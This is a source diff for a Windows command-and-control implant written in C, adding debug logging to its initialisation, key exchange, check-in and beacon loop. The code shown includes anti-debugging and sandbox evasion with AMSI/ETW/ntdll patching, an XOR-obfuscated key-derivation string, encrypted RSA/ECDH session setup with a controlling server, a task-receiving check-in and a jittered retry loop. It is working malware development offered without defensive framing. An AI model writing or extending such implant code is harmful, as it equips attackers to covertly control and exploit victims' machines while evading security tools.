@@ -116,17 +116,33 @@ BOOL agent_init(AgentState *state) {
     state->nonce_counter = 0;  /* Agent uses even counters */
     state->msg_id = 0;
 
+    DBG("[init] agent_init starting, sleep=%d jitter=%d", CONFIG_SLEEP_MS, CONFIG_JITTER_PCT);
+
     /* Evasion: load-time anti-analysis + run-time patches (AMSI/ETW/ntdll) */
-    if (!evasion_init())
-        return FALSE;  /* Debugger/sandbox detected — bail silently */
+    if (!evasion_init()) {
+        DBG("[init] evasion_init FAILED — anti-debug/sandbox triggered, exiting");
+        return FALSE;
+    }
+    DBG("[init] evasion_init OK");
 
     generate_agent_id(state->agent_id);
+    DBG("[init] agent_id generated");
 
-    if (!crypto_init()) return FALSE;
+    if (!crypto_init()) {
+        DBG("[init] crypto_init FAILED");
+        return FALSE;
+    }
+    DBG("[init] crypto_init OK");
 
     /* Register and initialize channels */
     channels_register();
-    if (!channel_init_active()) return FALSE;
+    DBG("[init] channels registered, count=%d", g_channel_count);
+
+    if (!channel_init_active()) {
+        DBG("[init] channel_init_active FAILED");
+        return FALSE;
+    }
+    DBG("[init] channel_init_active OK (HTTP session created)");
 
     /* Start SMB pipe server if configured */
     if (CONFIG_PIPE_ENABLED == 1)
@@ -149,12 +165,17 @@ BOOL agent_key_exchange(AgentState *state) {
      * 8. Verify KEY_EXCHANGE_RESP
      */
 
+    DBG("[kex] key exchange starting");
+
     /* Step 1: Generate ECDH keypair */
     unsigned char my_pub[ECDH_PUBKEY_SIZE];
     BCRYPT_KEY_HANDLE my_priv = NULL;
 
-    if (!ecdh_generate_keypair(my_pub, &my_priv))
+    if (!ecdh_generate_keypair(my_pub, &my_priv)) {
+        DBG("[kex] ecdh_generate_keypair FAILED");
         return FALSE;
+    }
+    DBG("[kex] ECDH keypair generated");
 
     /* Step 2: Build key exchange payload */
     unsigned char kex_payload[UUID_SIZE + ECDH_PUBKEY_SIZE];
@@ -164,13 +185,16 @@ BOOL agent_key_exchange(AgentState *state) {
     /* Step 3: RSA encrypt */
     unsigned char *rsa_ct = NULL;
     DWORD rsa_ct_len;
+    DBG("[kex] RSA encrypting %u bytes (modulus len=%u)", (unsigned)sizeof(kex_payload), RSA_MODULUS_LEN);
     if (!rsa_encrypt(RSA_MODULUS, RSA_MODULUS_LEN,
                      RSA_EXPONENT, RSA_EXPONENT_LEN,
                      kex_payload, sizeof(kex_payload),
                      &rsa_ct, &rsa_ct_len)) {
+        DBG("[kex] rsa_encrypt FAILED");
         ecdh_free_key(my_priv);
         return FALSE;
     }
+    DBG("[kex] RSA encrypted, ct_len=%u", rsa_ct_len);
 
     /* Step 4: Wrap in packet frame */
     Buffer pkt;
@@ -181,22 +205,27 @@ BOOL agent_key_exchange(AgentState *state) {
     /* Step 5: Send via HTTP */
     unsigned char *resp_raw = NULL;
     DWORD resp_raw_len;
+    DBG("[kex] sending packet (%u bytes) via channel", pkt.len);
     BOOL ok = channel_send_recv(pkt.data, pkt.len, &resp_raw, &resp_raw_len);
     buf_free(&pkt);
 
     if (!ok || !resp_raw) {
+        DBG("[kex] channel_send_recv FAILED (ok=%d, resp=%p)", ok, resp_raw);
         ecdh_free_key(my_priv);
         return FALSE;
     }
+    DBG("[kex] got response, %u bytes", resp_raw_len);
 
     /* Step 6: Parse response packet header */
     DWORD magic, size, msg_id;
     if (!packet_unpack_header(resp_raw, resp_raw_len, &magic, &size, &msg_id) ||
         magic != CONFIG_MAGIC) {
+        DBG("[kex] packet header invalid (magic=0x%08X, expected=0x%08X)", magic, CONFIG_MAGIC);
         free(resp_raw);
         ecdh_free_key(my_priv);
         return FALSE;
     }
+    DBG("[kex] packet header OK, size=%u msg_id=%u", size, msg_id);
 
     /*
      * Response is encrypted with the session key we haven't derived yet.
@@ -281,12 +310,15 @@ BOOL agent_key_exchange(AgentState *state) {
 
     /* Derive shared secret */
     unsigned char shared_secret[32];
+    DBG("[kex] deriving ECDH shared secret");
     if (!ecdh_derive_shared_secret(my_priv, server_pub, shared_secret)) {
+        DBG("[kex] ecdh_derive_shared_secret FAILED");
         free(resp_raw);
         ecdh_free_key(my_priv);
         return FALSE;
     }
     ecdh_free_key(my_priv);
+    DBG("[kex] shared secret derived OK");
 
     /* Derive session key via HKDF-SHA256 */
     unsigned char hkdf_info[] = {'c'^0x5A,'2'^0x5A,'_'^0x5A,'s'^0x5A,'e'^0x5A,
@@ -304,25 +336,30 @@ BOOL agent_key_exchange(AgentState *state) {
     SecureZeroMemory(hkdf_info, sizeof(hkdf_info));
     SecureZeroMemory(shared_secret, 32);
     state->has_session_key = TRUE;
+    DBG("[kex] session key derived via HKDF");
 
     /* Decrypt response to verify */
     unsigned char *resp_pt = NULL;
     DWORD resp_pt_len;
     if (aes_gcm_decrypt(state->session_key, encrypted_resp, encrypted_resp_len,
                         &resp_pt, &resp_pt_len)) {
+        DBG("[kex] AES-GCM decrypt OK, pt_len=%u", resp_pt_len);
         /* Parse command — should be KEY_EXCHANGE_RESP */
         BYTE cmd;
         const unsigned char *body;
         DWORD body_len;
         if (command_unpack(resp_pt, resp_pt_len, &cmd, &body, &body_len)) {
             if (cmd != CMD_KEY_EXCHANGE_RESP) {
+                DBG("[kex] unexpected cmd=0x%02X (expected KEY_EXCHANGE_RESP)", cmd);
                 free(resp_pt);
                 free(resp_raw);
                 return FALSE;
             }
+            DBG("[kex] KEY_EXCHANGE complete — session established!");
         }
         free(resp_pt);
     } else {
+        DBG("[kex] AES-GCM decrypt FAILED (enc_len=%u)", encrypted_resp_len);
         free(resp_raw);
         return FALSE;
     }
@@ -334,7 +371,11 @@ BOOL agent_key_exchange(AgentState *state) {
 /* ─── Check-in: send sysinfo, receive tasks ─── */
 
 BOOL agent_checkin(AgentState *state) {
-    if (!state->has_session_key) return FALSE;
+    DBG("[checkin] starting checkin");
+    if (!state->has_session_key) {
+        DBG("[checkin] no session key!");
+        return FALSE;
+    }
 
     /* Build check-in TLV body */
     Buffer body;
@@ -374,12 +415,17 @@ BOOL agent_checkin(AgentState *state) {
     BOOL ok = channel_send_recv(pkt.data, pkt.len, &resp_raw, &resp_raw_len);
     buf_free(&pkt);
 
-    if (!ok || !resp_raw) return FALSE;
+    if (!ok || !resp_raw) {
+        DBG("[checkin] send_recv FAILED");
+        return FALSE;
+    }
+    DBG("[checkin] got response %u bytes", resp_raw_len);
 
     /* Parse response */
     DWORD magic, size, msg_id;
     if (!packet_unpack_header(resp_raw, resp_raw_len, &magic, &size, &msg_id) ||
         magic != CONFIG_MAGIC) {
+        DBG("[checkin] bad packet header");
         free(resp_raw);
         return FALSE;
     }
@@ -392,9 +438,11 @@ BOOL agent_checkin(AgentState *state) {
     DWORD pt_len;
     if (!aes_gcm_decrypt(state->session_key, enc_payload, enc_payload_len,
                          &plaintext, &pt_len)) {
+        DBG("[checkin] decrypt FAILED");
         free(resp_raw);
         return FALSE;
     }
+    DBG("[checkin] decrypt OK, processing tasks");
     free(resp_raw);
 
     /* Parse command */
@@ -579,20 +627,28 @@ void agent_run(AgentState *state) {
 int main(void) {
     AgentState state;
 
-    if (!agent_init(&state))
+    DBG("[main] agent starting, PID=%u", GetCurrentProcessId());
+
+    if (!agent_init(&state)) {
+        DBG("[main] agent_init FAILED — exiting");
         return 1;
+    }
+    DBG("[main] agent_init OK, starting key exchange");
 
     /* Key exchange with retry */
     int retries = 0;
     while (!agent_key_exchange(&state)) {
         retries++;
+        DBG("[main] key exchange attempt %d FAILED", retries);
         if (retries > 10) {
+            DBG("[main] giving up after %d key exchange attempts", retries);
             crypto_cleanup();
             http_cleanup();
             return 1;
         }
         Sleep(5000 + (rand() % 5000));
     }
+    DBG("[main] key exchange succeeded, entering main loop");
 
     /* Main beacon loop */
     agent_run(&state);
